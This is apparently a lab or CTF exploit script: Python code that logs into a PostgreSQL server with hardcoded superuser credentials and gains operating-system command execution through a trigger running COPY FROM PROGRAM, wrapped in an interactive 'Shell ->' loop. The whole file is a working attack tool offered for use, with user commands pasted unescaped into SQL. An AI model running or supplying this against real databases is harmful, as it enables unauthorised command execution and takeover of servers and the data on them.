import psycopg2
import sys


rhost = "192.168.211.108"
rport = 5432
user = "postgres"
password = "PolicyWielderCandle120"
database = "splodge"

conn = psycopg2.connect(
    host=rhost,
    database=database,
    user=user,
    password=password,
    port=rport)

###Connecting to Database
cur = conn.cursor()

def psql_exec(cur, cmd):
    ###Creating Table for Command Trigger
    cur.execute("""CREATE TABLE IF NOT EXISTS trigger_test (
        tt_id serial PRIMARY KEY,
        command_output text
    );""")
    cur.execute("TRUNCATE TABLE trigger_test;")

    #Creating Function
    try:
        cur.execute(f"""CREATE OR REPLACE FUNCTION trigger_test_execute_command()
        RETURNS TRIGGER
        LANGUAGE plpgsql
        AS $BODY$
        BEGIN
        COPY trigger_test (command_output) FROM PROGRAM '{cmd}';
        RETURN NULL;
        END;
        $BODY$;
        """)
    except ExternalRoutineException:
        print("Permission Denied: Create Function")

    #Reading table content
    cur.execute("""CREATE TABLE IF NOT EXISTS trigger_test_source (
        s_id integer PRIMARY KEY
    );""")

    #Execute Trigger (Run command)
    cur.execute("""DROP TRIGGER IF EXISTS tr_trigger_test_execute_command on trigger_test_source""")
    cur.execute("""CREATE TRIGGER tr_trigger_test_execute_command
        AFTER INSERT
        ON trigger_test_source
        FOR EACH STATEMENT
        EXECUTE PROCEDURE trigger_test_execute_command();""")

    #Send value to table
    cur.execute("TRUNCATE TABLE trigger_test_source;")
    try:
        cur.execute("INSERT INTO trigger_test_source VALUES (2);")
        cur.execute("TABLE trigger_test;")

        #Output value
        row = cur.fetchone()
        while row is not None:
            print(row[1])
            row = cur.fetchone()
    except psycopg2.errors.ExternalRoutineException:
        print("Permission Denied: trigger_test_source")
        try:
            cur.execute("TRUNCATE TABLE trigger_test_source;")
        except psycopg2.errors.InFailedSqlTransaction:
            cur.execute("ROLLBACK")
    except psycopg2.errors.BadCopyFileFormat:
        print("TODO: Execute the command piped into base64, then base64 decode")
        cur.execute("ROLLBACK")

if __name__ == "__main__":
    try:
        try:
            psql_exec(cur, "id")
        except:
            print("Command execution does not seem to work")
        while True:
            cmd = input("Shell -> ")
            psql_exec(cur, cmd)
            print() 

    except KeyboardInterrupt:
        # quit
        print()
        print("Exiting...")
        sys.exit()
